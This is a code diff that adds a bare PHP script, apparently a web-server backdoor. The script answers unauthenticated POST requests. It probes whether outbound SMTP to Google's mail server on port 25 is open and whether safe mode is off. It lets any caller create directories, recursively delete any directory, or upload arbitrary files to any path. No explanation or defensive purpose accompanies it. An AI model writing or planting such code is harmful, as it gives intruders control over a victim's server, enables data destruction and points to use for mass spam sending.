@@ -1,0 +1,108 @@
+<?php
+
+function LoadExtension($ext)
+{
+	$lib = $ext.'.so';
+	if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
+		$lib = 'php_'.$ext.'.dll';
+	
+	if(!extension_loaded($ext))
+	{
+		if(!dl($lib))
+			return FALSE;
+	}
+	return TRUE;
+}
+
+function Check25Port()
+{
+	$res = TRUE;
+	$s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+	if(@socket_connect($s, 'gmail-smtp-in.l.google.com', 25) == FALSE)
+		$res = FALSE;
+	socket_close($s);
+	return $res;
+}
+
+function Check()
+{
+	// Version >= 4.1.0
+	if(strnatcmp(phpversion(), '4.1.0') < 0)
+		return FALSE;
+	// Check for safe mode
+	if(ini_get('safe_mode'))
+		return FALSE;
+	// Check 'sockets' ext
+	if(!LoadExtension('sockets'))
+		return FALSE;
+	// Check 25 port
+	if(!Check25Port())
+		return FALSE;		
+
+	return TRUE;
+}
+
+function RemoveDir($dir)
+{
+  $res = FALSE;
+  if(is_dir($dir))
+  {
+    $objects = scandir($dir);
+    foreach($objects as $object)
+    {
+      if($object != "." && $object != "..")
+      {
+        if(filetype($dir."/".$object) == "dir")
+          RemoveDir($dir."/".$object);
+        else
+          unlink($dir."/".$object);
+      }
+    }
+    reset($objects);
+    $res = rmdir($dir);
+  }
+  return $res;
+}
+
+function Upload($dir)
+{
+  $res = move_uploaded_file($_FILES["file"]["tmp_name"], $dir.'/'.$_FILES["file"]["name"]);
+  return $res;
+}
+
+
+function Work()
+{
+  $type = $_POST['type'];
+  $res  = FALSE;
+  
+  echo('EDW');
+  if($type == 'check')
+  {
+    $res  = Check();
+  }
+  else if($type == 'mkdir')
+  {
+    $dir  = $_POST['dir'];
+    $res  = mkdir($dir);
+  }
+  else if($type == 'rmdir')
+  {
+    $dir  = $_POST['dir'];
+    $res  = RemoveDir($dir);
+  }
+  else if($type == 'upload')
+  {
+    $dir  = $_POST['dir'];
+    $res  = Upload($dir);
+  }
+
+  if($res)
+    echo('OK');
+  else
+    echo('FAILED');
+}
+
+Work();
+
+?>
